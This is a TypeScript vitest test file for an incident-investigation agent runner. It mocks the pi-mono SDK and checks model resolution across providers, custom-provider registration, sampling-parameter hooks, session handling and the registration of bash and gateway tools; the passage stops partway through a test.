import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import {
  AgentRunner,
  extractSkillNameFromReadPath,
  mapThinkingLevel,
  OPENROUTER_ATTRIBUTION_HEADERS,
  openRouterAttributionEnabled,
  resolveModel,
  type ExecuteParams,
  type ResumeParams,
} from "../src/agent-runner.js";
import type { LLMSettings, ThinkingLevel, ProxyConfig } from "../src/types.js";

// ---------------------------------------------------------------------------
// Mock the pi-mono SDK modules
// ---------------------------------------------------------------------------

// Session mock that captures all calls
function createMockSession() {
  const subscribers: Array<(event: any) => void> = [];
  return {
    sessionId: "mock-session-123",
    // Mirrors AgentSession.agent, on which createAgentSession installs its own
    // onPayload (the `before_provider_request` extension dispatch).
    agent: { onPayload: undefined as undefined | ((p: unknown, m: unknown) => unknown) },
    subscribe: vi.fn((listener: (event: any) => void) => {
      subscribers.push(listener);
      return () => {
        const idx = subscribers.indexOf(listener);
        if (idx >= 0) subscribers.splice(idx, 1);
      };
    }),
    prompt: vi.fn(async (_text: string) => {
      // Simulate events: message_update with text_delta, then turn_end
      for (const sub of subscribers) {
        sub({
          type: "message_update",
          message: {},
          assistantMessageEvent: {
            type: "text_delta",
            contentIndex: 0,
            delta: "Analysis complete.",
            partial: {},
          },
        });
      }
      for (const sub of subscribers) {
        sub({
          type: "turn_end",
          message: {
            role: "assistant",
            usage: { totalTokens: 1500, input: 1000, output: 500 },
          },
          toolResults: [],
        });
      }
    }),
    abort: vi.fn(async () => {}),
    getLastAssistantText: vi.fn(() => "Analysis complete."),
    _emitEvent: (event: any) => {
      for (const sub of subscribers) {
        sub(event);
      }
    },
    _subscribers: subscribers,
  };
}

let mockSession = createMockSession();
let createAgentSessionCalls: any[] = [];
// Provider ids pi ships itself; anything else needs an explicit registration
// before auth can resolve. Confirmed against the live SDK.
const PI_BUILTIN_PROVIDERS = new Set([
  "openai",
  "anthropic",
  "google",
  "openrouter",
  "nvidia",
  "minimax",
  "ant-ling",
]);
let registeredProviders: string[] = [];

// Records the options of every GatewayClient the runner builds, so tests can
// check what reaches the gateway (incident id, run id, allowlist).
const gatewayClientOptions = vi.hoisted(() => [] as any[]);
vi.mock("../src/gateway-client.js", async (importOriginal) => {
  const mod = await importOriginal<typeof import("../src/gateway-client.js")>();
  class RecordingGatewayClient extends mod.GatewayClient {
    constructor(options: import("../src/gateway-client.js").GatewayClientOptions) {
      super(options);
      gatewayClientOptions.push(options);
    }
  }
  return { ...mod, GatewayClient: RecordingGatewayClient };
});

vi.mock("@earendil-works/pi-coding-agent", () => {
  return {
    createAgentSession: vi.fn(async (opts: any) => {
      createAgentSessionCalls.push(opts);
      return { session: mockSession, extensionsResult: {} };
    }),
    AgentSession: vi.fn(),
    ModelRuntime: {
      create: vi.fn(async () => {
        // Mirrors the real ModelRuntime: pi's Models.getAuth resolves only for
        // providers present in the registry, regardless of stored credentials
        // (`if (!providers.get(id)) return undefined`). Verified against the
        // live SDK — every Akmatori provider except "custom" is a pi built-in.
        const registered = new Set<string>();
        return {
          setRuntimeApiKey: vi.fn(async () => {}),
          registerProvider: vi.fn((id: string) => {
            registered.add(id);
            registeredProviders.push(id);
          }),
          getAuth: vi.fn(async (model: any) =>
            PI_BUILTIN_PROVIDERS.has(model?.provider) || registered.has(model?.provider)
              ? { auth: { apiKey: "resolved" } }
              : undefined,
          ),
        };
      }),
    },
    SessionManager: {
      inMemory: vi.fn(() => ({
        newSession: vi.fn(),
        getSessionId: vi.fn(() => "mock-session-123"),
        getSessionFile: vi.fn(() => undefined),
      })),
      create: vi.fn(() => ({
        newSession: vi.fn(),
        getSessionId: vi.fn(() => "mock-session-123"),
        getSessionFile: vi.fn(() => undefined),
      })),
      continueRecent: vi.fn(() => ({
        newSession: vi.fn(),
        getSessionId: vi.fn(() => "mock-session-123"),
        getSessionFile: vi.fn(() => undefined),
      })),
      open: vi.fn(() => ({
        newSession: vi.fn(),
        getSessionId: vi.fn(() => "mock-session-123"),
        getSessionFile: vi.fn(() => undefined),
      })),
    },
    SettingsManager: {
      inMemory: vi.fn(() => ({})),
      create: vi.fn(() => ({})),
    },
    DefaultResourceLoader: vi.fn().mockImplementation(() => ({
      reload: vi.fn(async () => {}),
      getSkills: vi.fn(() => ({ skills: [], diagnostics: [] })),
      getPrompts: vi.fn(() => ({ prompts: [], diagnostics: [] })),
      getThemes: vi.fn(() => ({ themes: [], diagnostics: [] })),
      getExtensions: vi.fn(() => ({})),
      getAgentsFiles: vi.fn(() => ({ agentsFiles: [] })),
      getSystemPrompt: vi.fn(() => undefined),
      getAppendSystemPrompt: vi.fn(() => []),
      getPathMetadata: vi.fn(() => new Map()),
      extendResources: vi.fn(),
    })),
    createCodemodeExtension: vi.fn((opts: any) => ({ __codemodeFactory: true, opts })),
    createBashToolDefinition: vi.fn((_cwd: string, _opts?: any) => ({
      name: "bash",
      label: "Bash",
      description: "Execute bash commands",
      parameters: {},
      execute: vi.fn(),
      _spawnHookOpts: _opts,
    })),
    defineTool: vi.fn((tool: any) => tool),
    getAgentDir: vi.fn(() => "/tmp/mock-agent-dir"),
  };
});

vi.mock("@earendil-works/pi-ai/providers/all", () => {
  return {
    getBuiltinModel: vi.fn((provider: string, modelId: string) => {
      // Return a mock model for known combinations
      if (provider === "anthropic" && modelId === "claude-sonnet-4-5-20250929") {
        return {
          id: "claude-sonnet-4-5-20250929",
          name: "Claude Sonnet 4.5",
          api: "anthropic-messages",
          provider: "anthropic",
          baseUrl: "https://api.anthropic.com",
          reasoning: true,
          input: ["text", "image"],
          cost: { input: 3, output: 15, cacheRead: 0.3, cacheWrite: 3.75 },
          contextWindow: 200000,
          maxTokens: 16384,
        };
      }
      if (provider === "openai" && modelId === "gpt-4o") {
        return {
          id: "gpt-4o",
          name: "GPT-4o",
          api: "openai-responses",
          provider: "openai",
          baseUrl: "https://api.openai.com/v1",
          reasoning: false,
          input: ["text", "image"],
          cost: { input: 2.5, output: 10, cacheRead: 1.25, cacheWrite: 0 },
          contextWindow: 128000,
          maxTokens: 16384,
        };
      }
      // MiniMax-M3 is a built-in in pi-ai 0.78.1 using api:anthropic-messages
      // but WITHOUT forceAdaptiveThinking in the SDK registry. We deliberately
      // do not include the flag here to match the real SDK state and let tests
      // verify that resolveModel merges it in for the minimax provider.
      if (provider === "minimax" && modelId === "MiniMax-M3-builtin-mock") {
        return {
          id: "MiniMax-M3-builtin-mock",
          name: "MiniMax-M3",
          api: "anthropic-messages",
          provider: "minimax",
          baseUrl: "https://api.minimax.io/anthropic",
          reasoning: true,
          input: ["text", "image"],
          cost: { input: 0.6, output: 2.4, cacheRead: 0.12, cacheWrite: 0 },
          contextWindow: 512000,
          maxTokens: 128000,
          // compat intentionally omitted — no forceAdaptiveThinking in registry
        };
      }
      // Simulate pi-ai behavior where unknown models may return undefined
      // instead of throwing (observed for custom providers).
      if (provider === "custom" && modelId === "my-model-undefined-return") {
        return undefined as any;
      }
      // Unknown model - throw to trigger fallback
      throw new Error(`Unknown model: ${provider}/${modelId}`);
    }),
  };
});


// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

async function waitForCondition(fn: () => boolean, timeoutMs = 1000): Promise<void> {
  const deadline = Date.now() + timeoutMs;
  while (!fn()) {
    if (Date.now() > deadline) throw new Error("Timed out waiting for condition");
    await new Promise((resolve) => setTimeout(resolve, 5));
  }
}

function makeLLMSettings(overrides?: Partial<LLMSettings>): LLMSettings {
  return {
    provider: "anthropic",
    api_key: "sk-test-key-123",
    model: "claude-sonnet-4-5-20250929",
    thinking_level: "medium",
    ...overrides,
  };
}

function makeExecuteParams(overrides?: Partial<ExecuteParams>): ExecuteParams {
  return {
    incidentId: "inc-001",
    task: "Investigate high CPU on web-01",
    llmSettings: makeLLMSettings(),
    workDir: "/tmp/workspace",
    onOutput: vi.fn(),
    ...overrides,
  };
}

function makeResumeParams(overrides?: Partial<ResumeParams>): ResumeParams {
  return {
    incidentId: "inc-001",
    sessionId: "mock-session-123",
    message: "Check disk usage too",
    llmSettings: makeLLMSettings(),
    workDir: "/tmp/workspace",
    onOutput: vi.fn(),
    ...overrides,
  };
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe("mapThinkingLevel", () => {
  it("should keep 'off' as 'off' so pi-mono omits reasoning_effort", () => {
    expect(mapThinkingLevel("off")).toBe("off");
  });

  it("should map 'minimal' to 'minimal'", () => {
    expect(mapThinkingLevel("minimal")).toBe("minimal");
  });

  it("should map 'low' to 'low'", () => {
    expect(mapThinkingLevel("low")).toBe("low");
  });

  it("should map 'medium' to 'medium'", () => {
    expect(mapThinkingLevel("medium")).toBe("medium");
  });

  it("should map 'high' to 'high'", () => {
    expect(mapThinkingLevel("high")).toBe("high");
  });

  it("should map 'xhigh' to 'xhigh'", () => {
    expect(mapThinkingLevel("xhigh")).toBe("xhigh");
  });

  it("should default to 'medium' for unknown values", () => {
    expect(mapThinkingLevel("unknown" as ThinkingLevel)).toBe("medium");
  });
});

describe("resolveModel", () => {
  it("should return model from pi-ai registry for known provider/model", () => {
    const model = resolveModel("anthropic", "claude-sonnet-4-5-20250929");
    expect(model.id).toBe("claude-sonnet-4-5-20250929");
    expect(model.provider).toBe("anthropic");
    expect(model.api).toBe("anthropic-messages");
  });

  it("should return model from pi-ai registry for OpenAI", () => {
    const model = resolveModel("openai", "gpt-4o");
    expect(model.id).toBe("gpt-4o");
    expect(model.provider).toBe("openai");
  });

  it("should create custom model spec for unknown provider/model", () => {
    const model = resolveModel("custom", "my-model", "https://my-api.example.com");
    expect(model.id).toBe("my-model");
    // Not "custom": the runtime credential and provider registration are
    // keyed by "akmatori-custom" (runtimeProviderId).
    expect(model.provider).toBe("akmatori-custom");
    expect(model.api).toBe("openai-completions");
    expect(model.baseUrl).toBe("https://my-api.example.com");
  });

  // The resolved model's provider must match the id the parent runtime's
  // credential and provider registration use.
  it("should resolve custom models under the runtime provider id", () => {
    const model = resolveModel("custom", "deepseek-ai/DeepSeek-V4-Flash", "https://e.example/v1");
    expect(`${model.provider}/${model.id}`).toBe("akmatori-custom/deepseek-ai/DeepSeek-V4-Flash");
  });

  it("should leave built-in provider ids untouched", () => {
    expect(resolveModel("anthropic", "claude-sonnet-5").provider).toBe("anthropic");
    expect(resolveModel("nvidia", "meta/llama-3.3-70b-instruct").provider).toBe("nvidia");
  });

  it("should create custom model spec when getModel returns undefined", () => {
    const model = resolveModel("custom", "my-model-undefined-return", "https://my-api.example.com");
    expect(model.id).toBe("my-model-undefined-return");
    expect(model.provider).toBe("akmatori-custom");
    expect(model.api).toBe("openai-completions");
    expect(model.baseUrl).toBe("https://my-api.example.com");
  });

  it("should create custom model spec for openrouter", () => {
    const model = resolveModel("openrouter", "anthropic/claude-3.5-sonnet");
    expect(model.id).toBe("anthropic/claude-3.5-sonnet");
    expect(model.provider).toBe("openrouter");
    expect(model.api).toBe("openai-completions");
  });

  it("should disable long cache retention for unknown custom endpoints", () => {
    // Many OpenAI-compatible gateways (e.g. Envoy AI Gateway) reject
    // prompt_cache_key / prompt_cache_retention with a 400, which pi-ai's
    // overflow detector then misclassifies as a context overflow.
    const model = resolveModel("custom", "my-model", "https://my-api.example.com");
    expect((model as { compat?: { supportsLongCacheRetention?: boolean } }).compat?.supportsLongCacheRetention).toBe(false);
  });

  it("should send instructions as role system for custom endpoints", () => {
    // pi-ai sends role "developer" for a reasoning model on an unrecognized
    // URL; gcore's DeepSeek gateway dropped it, so one-shot calls had no
    // system prompt at all.
    const model = resolveModel("custom", "my-model", "https://my-api.example.com");
    expect((model as { compat?: { supportsDeveloperRole?: boolean } }).compat?.supportsDeveloperRole).toBe(false);
  });

  it("should not send store to custom endpoints", () => {
    // LiteLLM rejects `store` for ollama_chat/ models with 400
    // UnsupportedParamsError unless the proxy sets drop_params.
    const model = resolveModel("custom", "my-model", "http://litellm:4000/v1");
    expect((model as { compat?: { supportsStore?: boolean } }).compat?.supportsStore).toBe(false);
  });

  it("should not force-disable long cache retention for openrouter", () => {
    const model = resolveModel("openrouter", "anthropic/claude-3.5-sonnet");
    expect((model as { compat?: { supportsLongCacheRetention?: boolean } }).compat?.supportsLongCacheRetention).toBeUndefined();
  });

  it("should use correct API type for known provider with unknown model", () => {
    const model = resolveModel("google", "gemini-new-model");
    expect(model.api).toBe("google-generative-ai");
    expect(model.provider).toBe("google");
  });

  it("should set forceAdaptiveThinking for minimax (anthropic-messages apiType)", () => {
    const model = resolveModel("minimax", "minimax-unknown-model");
    expect(model.api).toBe("anthropic-messages");
    expect((model as { compat?: { forceAdaptiveThinking?: boolean } }).compat?.forceAdaptiveThinking).toBe(true);
  });

  it("should NOT set forceAdaptiveThinking for unknown native Anthropic model (falls through to synthesized spec)", () => {
    // Native Anthropic models must not receive forceAdaptiveThinking even when the
    // model is not in the SDK registry. Only ADAPTIVE_THINKING_REQUIRED_PROVIDERS
    // (e.g. minimax) need it. Setting it on Anthropic models sends the wrong
    // thinking wire format to Anthropic's endpoint.
    const model = resolveModel("anthropic", "claude-hypothetical-future-model");
    expect(model.api).toBe("anthropic-messages");
    expect((model as { compat?: { forceAdaptiveThinking?: boolean } }).compat?.forceAdaptiveThinking).toBeUndefined();
  });

  it("should not set forceAdaptiveThinking for custom (openai-completions apiType)", () => {
    const model = resolveModel("custom", "my-model", "https://my-api.example.com");
    expect(model.api).toBe("openai-completions");
    expect((model as { compat?: { forceAdaptiveThinking?: boolean } }).compat?.forceAdaptiveThinking).toBeUndefined();
  });

  it("should not set forceAdaptiveThinking for openrouter (openai-completions apiType)", () => {
    const model = resolveModel("openrouter", "some/model");
    expect(model.api).toBe("openai-completions");
    expect((model as { compat?: { forceAdaptiveThinking?: boolean } }).compat?.forceAdaptiveThinking).toBeUndefined();
  });

  it("should use openai-completions api for nvidia provider", () => {
    const model = resolveModel("nvidia", "meta/llama-3.3-70b-instruct");
    expect(model.api).toBe("openai-completions");
    expect((model as { compat?: { forceAdaptiveThinking?: boolean } }).compat?.forceAdaptiveThinking).toBeUndefined();
  });

  it("should use openai-completions api for ant-ling provider", () => {
    const model = resolveModel("ant-ling", "Ling-2.6-1T");
    expect(model.api).toBe("openai-completions");
    expect((model as { compat?: { forceAdaptiveThinking?: boolean } }).compat?.forceAdaptiveThinking).toBeUndefined();
  });

  it("should set forceAdaptiveThinking for MiniMax-M3 built-in (anthropic-messages, no compat in SDK registry)", () => {
    // MiniMax-M3 is a built-in in pi-ai 0.78.1 using api:anthropic-messages but
    // without forceAdaptiveThinking in the registry. resolveModel must merge the
    // flag before returning so the effort-based adaptive thinking path is used
    // instead of budget-based thinking with the interleaved-thinking beta header.
    const model = resolveModel("minimax", "MiniMax-M3");
    expect(model.api).toBe("anthropic-messages");
    expect(model.provider).toBe("minimax");
    expect((model as { compat?: { forceAdaptiveThinking?: boolean } }).compat?.forceAdaptiveThinking).toBe(true);
  });

  it("should NOT set forceAdaptiveThinking on a native Anthropic built-in that the SDK left unmarked", () => {
    // claude-sonnet-4-5-20250929 is in the SDK built-in registry without
    // forceAdaptiveThinking. The fix at line 165 must NOT add it for native
    // Anthropic models — only for providers in ADAPTIVE_THINKING_REQUIRED_PROVIDERS
    // (currently minimax). Forcing the flag on unmarked Anthropic models would
    // send the wrong thinking wire format to Anthropic's endpoint.
    const model = resolveModel("anthropic", "claude-sonnet-4-5-20250929");
    expect(model.api).toBe("anthropic-messages");
    expect(model.provider).toBe("anthropic");
    expect((model as { compat?: { forceAdaptiveThinking?: boolean } }).compat?.forceAdaptiveThinking).toBeUndefined();
  });

  it("should set forceAdaptiveThinking when getModel returns a MiniMax built-in without the flag", () => {
    // Uses the mock for "MiniMax-M3-builtin-mock" which returns a genuine
    // built-in-style model for the minimax provider WITHOUT forceAdaptiveThinking.
    // resolveModel must merge the flag via the built-in path (not the synthesized
    // fallback) so that in production — where MiniMax-M3 IS in the registry —
    // the parent session uses the correct adaptive thinking wire format.
    const model = resolveModel("minimax", "MiniMax-M3-builtin-mock");
    expect(model.api).toBe("anthropic-messages");
    expect(model.provider).toBe("minimax");
    expect((model as { compat?: { forceAdaptiveThinking?: boolean } }).compat?.forceAdaptiveThinking).toBe(true);
  });
});

describe("AgentRunner", () => {
  let runner: AgentRunner;
  const originalEnv = { ...process.env };

  beforeEach(() => {
    vi.clearAllMocks();
    mockSession = createMockSession();
    createAgentSessionCalls = [];
    registeredProviders = [];
    runner = new AgentRunner({ mcpGatewayUrl: "http://mcp-gateway:8080" });
    // Reset env (both case variants — proxy.ts syncs both)
    delete process.env.HTTP_PROXY;
    delete process.env.HTTPS_PROXY;
    delete process.env.NO_PROXY;
    delete process.env.http_proxy;
    delete process.env.https_proxy;
    delete process.env.no_proxy;
  });

  afterEach(() => {
    // Restore env
    process.env = { ...originalEnv };
  });

  // -----------------------------------------------------------------------
  // execute
  // -----------------------------------------------------------------------

  describe("execute", () => {
    it("should create a session with correct parameters", async () => {
      const params = makeExecuteParams();
      await runner.execute(params);

      expect(createAgentSessionCalls).toHaveLength(1);
      const opts = createAgentSessionCalls[0];
      expect(opts.cwd).toBe("/tmp/workspace");
      expect(opts.model.id).toBe("claude-sonnet-4-5-20250929");
      expect(opts.thinkingLevel).toBe("medium");
    });

    // Regression: pi resolves auth via the provider registry, not the credential
    // store, so setRuntimeApiKey alone leaves a non-built-in provider
    // unauthenticated. A custom endpoint failed its first turn with "No API key
    // found for custom" while the key sat unused in memory.
    it("should register a custom provider so its API key can resolve", async () => {
      await runner.execute(
        makeExecuteParams({
          llmSettings: {
            ...makeLLMSettings(),
            provider: "custom",
            model: "deepseek-ai/DeepSeek-V4-Flash",
            base_url: "https://endpoint.example.com/v1",
          },
        }),
      );

      expect(registeredProviders).toContain("akmatori-custom");

      const runtime = await (
        await import("@earendil-works/pi-coding-agent")
      ).ModelRuntime.create.mock.results.at(-1)!.value;
      // The provider entry must carry the operator's endpoint and the model,
      // otherwise pi has a provider it cannot route.
      const [, config] = (runtime.registerProvider as any).mock.calls[0];
      expect(config.baseUrl).toBe("https://endpoint.example.com/v1");
      expect(config.models[0].id).toBe("deepseek-ai/DeepSeek-V4-Flash");
      // Auth resolves once registered — the condition that was failing. The
      // lookup uses the runtime provider id, which is what the resolved model
      // carries.
      await expect(
        runtime.getAuth({ provider: "akmatori-custom", id: "deepseek-ai/DeepSeek-V4-Flash" }),
      ).resolves.toBeTruthy();
    });

    it("should survive a failing auth probe instead of breaking the run", async () => {
      const { ModelRuntime } = await import("@earendil-works/pi-coding-agent");
      (ModelRuntime.create as any).mockImplementationOnce(async () => ({
        setRuntimeApiKey: vi.fn(async () => {}),
        registerProvider: vi.fn(),
        getAuth: vi.fn(async () => {
          throw new Error("credential store unavailable");
        }),
      }));

      const result = await runner.execute(
        makeExecuteParams({ llmSettings: { ...makeLLMSettings(), provider: "anthropic" } }),
      );
      expect(result.error).toBeUndefined();
    });

    it("should not register providers pi already ships", async () => {
      await runner.execute(
        makeExecuteParams({ llmSettings: { ...makeLLMSettings(), provider: "anthropic" } }),
      );
      expect(registeredProviders).toEqual([]);
    });

    it("should not install a payload hook when no sampling params are configured", async () => {
      await runner.execute(makeExecuteParams());
      expect(mockSession.agent.onPayload).toBeUndefined();
    });

    it("should inject configured sampling params into the provider payload", async () => {
      await runner.execute(
        makeExecuteParams({
          llmSettings: { ...makeLLMSettings(), temperature: 0.2, top_p: 0.9, max_tokens: 8192 },
        }),
      );

      const hook = mockSession.agent.onPayload;
      expect(hook).toBeDefined();
      const patched = await hook!(
        { model: "claude-sonnet-4-5", max_tokens: 4096 },
        { api: "anthropic-messages", provider: "anthropic" },
      );
      expect(patched).toMatchObject({ temperature: 0.2, top_p: 0.9, max_tokens: 8192 });
    });

    it("should chain, not replace, the SDK's own payload hook", async () => {
      // createAgentSession installs an onPayload that dispatches the
      // before_provider_request extension event; clobbering it would silently
      // disable extension payload rewriting for the whole session.
      const upstream = vi.fn((payload: any) => ({ ...payload, taggedByExtension: true }));
      mockSession.agent.onPayload = upstream as any;

      await runner.execute(
        makeExecuteParams({ llmSettings: { ...makeLLMSettings(), temperature: 0.2 } }),
      );

      const patched = await mockSession.agent.onPayload!(
        { model: "claude-sonnet-4-5" },
        { api: "anthropic-messages", provider: "anthropic" },
      );
      expect(upstream).toHaveBeenCalledTimes(1);
      expect(patched).toMatchObject({ taggedByExtension: true, temperature: 0.2 });
    });

    it("should use incident ID as deterministic session ID for new sessions", async () => {
      const { SessionManager } = await import("@earendil-works/pi-coding-agent");
      const params = makeExecuteParams({ incidentId: "inc-uuid-abc-123" });
      await runner.execute(params);

      // SessionManager.create should have been called (not continueRecent)
      expect(SessionManager.create).toHaveBeenCalled();

      // newSession should have been called with the incident ID
      const mockSessionManager = (SessionManager.create as any).mock.results[
        (SessionManager.create as any).mock.results.length - 1
      ].value;
      expect(mockSessionManager.newSession).toHaveBeenCalledWith({ id: "inc-uuid-abc-123" });
    });

    it("should pass sessionDir to SessionManager.create for workspace isolation", async () => {
      const { SessionManager } = await import("@earendil-works/pi-coding-agent");
      const params = makeExecuteParams({ workDir: "/tmp/workspace" });
      await runner.execute(params);

      // SessionManager.create should receive workDir and sessionDir
      expect(SessionManager.create).toHaveBeenCalledWith(
        "/tmp/workspace",
        "/tmp/workspace/.sessions",
      );
    });

    it("should NOT call newSession with deterministic ID for resume", async () => {
      const { SessionManager } = await import("@earendil-works/pi-coding-agent");
      const params = makeResumeParams({ incidentId: "inc-resume-456" });
      await runner.resume(params);

      // continueRecent should have been called (not create)
      expect(SessionManager.continueRecent).toHaveBeenCalled();

      // newSession should NOT have been called (resume uses existing session)
      const mockSessionManager = (SessionManager.continueRecent as any).mock.results[
        (SessionManager.continueRecent as any).mock.results.length - 1
      ].value;
      expect(mockSessionManager.newSession).not.toHaveBeenCalled();
    });

    it("should pass sessionDir to SessionManager.continueRecent for resume", async () => {
      const { SessionManager } = await import("@earendil-works/pi-coding-agent");
      const params = makeResumeParams({ workDir: "/tmp/workspace" });
      await runner.resume(params);

      expect(SessionManager.continueRecent).toHaveBeenCalledWith(
        "/tmp/workspace",
        "/tmp/workspace/.sessions",
      );
    });

    it("should call session.prompt with the task", async () => {
      const params = makeExecuteParams({ task: "Check memory usage" });
      await runner.execute(params);

      expect(mockSession.prompt).toHaveBeenCalledWith("Check memory usage");
    });

    it("should return ExecuteResult with session_id and response", async () => {
      const result = await runner.execute(makeExecuteParams());

      expect(result.session_id).toBe("mock-session-123");
      expect(result.response).toBe("Analysis complete.");
      expect(result.tokens_used).toBe(1500);
      expect(result.execution_time_ms).toBeGreaterThanOrEqual(0);
      expect(result.error).toBeUndefined();
    });

    it("should stream output via onOutput callback", async () => {
      const onOutput = vi.fn();
      const params = makeExecuteParams({ onOutput });
      await runner.execute(params);

      // Should have received text_delta output
      expect(onOutput).toHaveBeenCalledWith("Analysis complete.");
    });

    it("should forward events to onEvent callback", async () => {
      const onEvent = vi.fn();
      const params = makeExecuteParams({ onEvent });
      await runner.execute(params);

      expect(onEvent).toHaveBeenCalled();
      const eventTypes = onEvent.mock.calls.map((c: any[]) => c[0].type);
      expect(eventTypes).toContain("message_update");
      expect(eventTypes).toContain("turn_end");
    });

    it("should handle execution errors gracefully", async () => {
      mockSession.prompt.mockRejectedValueOnce(new Error("API rate limit exceeded"));

      const result = await runner.execute(makeExecuteParams());

      expect(result.error).toBe("API rate limit exceeded");
      expect(result.session_id).toBe("mock-session-123");
      expect(result.execution_time_ms).toBeGreaterThanOrEqual(0);
    });

    it("should clean up session from active map after completion", async () => {
      const params = makeExecuteParams({ incidentId: "inc-cleanup" });
      await runner.execute(params);

      expect(runner.hasActiveSession("inc-cleanup")).toBe(false);
    });

    it("should clean up session from active map after error", async () => {
      mockSession.prompt.mockRejectedValueOnce(new Error("fail"));

      const params = makeExecuteParams({ incidentId: "inc-err-cleanup" });
      await runner.execute(params);

      expect(runner.hasActiveSession("inc-err-cleanup")).toBe(false);
    });

    it("should use different providers", async () => {
      const params = makeExecuteParams({
        llmSettings: makeLLMSettings({
          provider: "openai",
          api_key: "sk-openai-key",
          model: "gpt-4o",
          thinking_level: "high",
        }),
      });
      await runner.execute(params);

      const opts = createAgentSessionCalls[0];
      expect(opts.model.id).toBe("gpt-4o");
      expect(opts.thinkingLevel).toBe("high");
    });

    it("should set the runtime API key on the ModelRuntime (in-memory, literal)", async () => {
      const { ModelRuntime } = await import("@earendil-works/pi-coding-agent");
      const params = makeExecuteParams({
        llmSettings: makeLLMSettings({
          provider: "anthropic",
          api_key: "sk-ant-my-key",
        }),
      });
      await runner.execute(params);

      // setRuntimeApiKey is called on the runtime with no third argument: pi
      // 0.84.0 repurposed it from catalog-refresh options to auth cancellation
      // options, and offline startup is guaranteed by allowModelNetwork:false at
      // create() instead. Passing the old `{allowNetwork:false}` would now be a
      // silently-ignored unknown option.
      const runtimeInstance = await (ModelRuntime as any).create.mock.results[0].value;
      expect(runtimeInstance.setRuntimeApiKey).toHaveBeenCalledWith("anthropic", "sk-ant-my-key");
      expect((ModelRuntime as any).create).toHaveBeenCalledWith(
        expect.objectContaining({ allowModelNetwork: false, modelsPath: null }),
      );
    });

    it("should not fail a run when the credential commits but fails to synchronize", async () => {
      // pi 0.84.0 routes setRuntimeApiKey through synchronizeCredentialState,
      // which raises CredentialSynchronizationError *after* the credential is
      // committed. This call sits on every incident's critical path, so the
      // throw must not fail the investigation.
      const { ModelRuntime } = await import("@earendil-works/pi-coding-agent");
      (ModelRuntime.create as any).mockImplementationOnce(async () => {
        const err = new Error("Credential setRuntimeApiKey committed for anthropic, but local synchronization failed");
        err.name = "CredentialSynchronizationError";
        return {
          setRuntimeApiKey: vi.fn(async () => {
            throw err;
          }),
          registerProvider: vi.fn(),
          getAuth: vi.fn(async () => ({ auth: { apiKey: "resolved" } })),
        };
      });

      const result = await runner.execute(
        makeExecuteParams({ llmSettings: { ...makeLLMSettings(), provider: "anthropic" } }),
      );
      expect(result.error).toBeUndefined();
    });

    it("should still propagate unrelated setRuntimeApiKey failures", async () => {
      const { ModelRuntime } = await import("@earendil-works/pi-coding-agent");
      (ModelRuntime.create as any).mockImplementationOnce(async () => ({
        setRuntimeApiKey: vi.fn(async () => {
          throw new Error("auth store is corrupt");
        }),
        registerProvider: vi.fn(),
        getAuth: vi.fn(async () => ({ auth: { apiKey: "resolved" } })),
      }));

      await expect(
        runner.execute(
          makeExecuteParams({ llmSettings: { ...makeLLMSettings(), provider: "anthropic" } }),
        ),
      ).rejects.toThrow("auth store is corrupt");
    });

    it("should create a ModelRuntime and pass it to the session (no direct key resolution)", async () => {
      const { ModelRuntime } = await import("@earendil-works/pi-coding-agent");
      const params = makeExecuteParams({
        llmSettings: makeLLMSettings({
          provider: "openai",
          api_key: "sk-openai-key",
        }),
      });
      await runner.execute(params);

      // ModelRuntime.create() should be called, and the runtime passed to createAgentSession.
      expect((ModelRuntime as any).create).toHaveBeenCalled();
      const opts = createAgentSessionCalls[0];
      expect(opts.modelRuntime).toBeDefined();

      // We never resolve API keys directly — the SDK handles key resolution
      // internally via the ModelRuntime.
    });

    it("should pass bash tool definition and gateway tools as customTools", async () => {
      const params = makeExecuteParams({ incidentId: "inc-tools" });
      await runner.execute(params);

      const opts = createAgentSessionCalls[0];
      expect(opts.customTools).toBeDefined();
      expect(opts.customTools).toHaveLength(6);

      const toolNames = opts.customTools.map((t: any) => t.name);
      expect(toolNames).toContain("bash");
      expect(toolNames).toContain("gateway_call");
      expect(toolNames).toContain("list_tools_for_tool_type");
      expect(toolNames).toContain("get_tool_detail");
      expect(toolNames).toContain("list_tool_types");
      expect(toolNames).toContain("execute_script");

      // All custom tools must have parameters and execute
      for (const tool of opts.customTools) {
        expect(tool.parameters).toBeDefined();
        expect(typeof tool.execute).toBe("function");
      }
    });

    it("should attach typed promptGuidelines array to the bash tool definition", async () => {
      const params = makeExecuteParams();
      await runner.execute(params);

      const opts = createAgentSessionCalls[0];
      // Bash tool is now in customTools as a proper ToolDefinition
      const bashTool = opts.customTools.find(
        (t: any) => t.name === "bash",
      );
      expect(bashTool).toBeDefined();
      expect(bashTool.promptGuidelines).toBeDefined();
      // promptGuidelines is now a typed string[] (ToolDefinition.promptGuidelines)
      expect(Array.isArray(bashTool.promptGuidelines)).toBe(true);
      expect(bashTool.promptGuidelines.length).toBeGreaterThan(0);

      const allGuidelines = bashTool.promptGuidelines.join("\n");
      expect(allGuidelines).toContain("gateway_call");
      expect(allGuidelines).toContain("SKILL.md");
      expect(allGuidelines).toContain("list_tools_for_tool_type");
      expect(allGuidelines).not.toContain("python3 -c");
      expect(allGuidelines).not.toContain("PYTHONPATH");
      // Verify opening line lists all 5 tools
      expect(allGuidelines).toContain("ALL infrastructure operations go through gateway_call");
      expect(allGuidelines).toContain("execute_script");
      expect(allGuidelines).toContain("get_tool_detail");
      expect(allGuidelines).toContain("list_tool_types");
      // Verify "Tool not found" guidance
      expect(allGuidelines).toContain("Tool not found");
      expect(allGuidelines).toContain("you are calling it wrong");
    });

    it("should configure bash spawnHook with MCP env vars via ToolDefinition", async () => {
      const params = makeExecuteParams({ incidentId: "inc-env" });
      await runner.execute(params);

      const opts = createAgentSessionCalls[0];
      // Bash tool definition is in customTools with spawnHook options
      const bashTool = opts.customTools.find(
        (t: any) => t.name === "bash",
      );
      expect(bashTool).toBeDefined();

      // Verify the spawnHook was passed to createBashToolDefinition
      const hookOpts = bashTool._spawnHookOpts;
      expect(hookOpts).toBeDefined();
      expect(hookOpts.spawnHook).toBeTypeOf("function");

      // Call the spawnHook and verify it injects MCP env vars into subprocess env
      const hookResult = hookOpts.spawnHook({ env: { PATH: "/usr/bin" } });
      expect(hookResult.env.MCP_GATEWAY_URL).toBeDefined();
